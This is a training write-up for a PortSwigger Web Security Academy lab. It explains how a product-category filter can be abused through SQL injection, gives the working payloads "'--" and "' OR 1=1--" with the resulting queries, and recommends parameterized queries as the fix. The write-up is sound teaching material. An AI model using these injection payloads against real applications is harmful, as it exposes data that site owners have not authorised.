# Lab 01 — SQL injection in WHERE clause allowing retrieval of hidden data

| | |
|---|---|
| **Difficulty** | 🟩 Apprentice |
| **Category** | Retrieving hidden data |
| **Concept** | [05 — Retrieving hidden data](https://portswigger.net/web-security/sql-injection) |
| **PortSwigger** | https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data |

---

## 🎯 Objective
The product-category filter runs a SQL query that hides unreleased products. Perform an SQL injection that makes the application **display all products in every category, including unreleased ones**.

## 🧠 Background
The category link builds this query:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
Two conditions restrict what you see: the category, and `released = 1`. Break out of the string literal and neutralize `released = 1`.

## 🪜 Methodology
1. Open a product category (e.g. **Gifts**). Note the URL:
   ```
   https://LAB-ID.web-security-academy.net/filter?category=Gifts
   ```
2. The value `Gifts` is placed inside single quotes in the query. Inject a `'` to test — the response changes/errors, confirming injection.
3. Comment out the rest of the query (removing `AND released = 1`), **or** make the whole `WHERE` always true.

## 💥 Payload
Comment-out approach (URL-encoded `'--`):
```
https://LAB-ID.web-security-academy.net/filter?category=Gifts'--
```
Resulting query:
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

Return **every** product in every category:
```
https://LAB-ID.web-security-academy.net/filter?category=Gifts'+OR+1=1--
```
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

## ✅ Why it works
`--` starts a SQL comment, so `AND released = 1` is discarded — unreleased items now pass the filter. `OR 1=1` makes the `WHERE` clause true for every row, dumping the whole catalogue.

## 🛡️ Remediation
Use a **parameterized query** and pass `category` as a bound parameter; keep `released = 1` as fixed server-side code the user can't touch. See [16 — Prevention](https://portswigger.net/web-security/sql-injection).

## 🔑 Takeaway
The most basic SQLi: a single `'` plus `--` rewrites the query's logic. `#sqli` `#apprentice` `#where-clause`
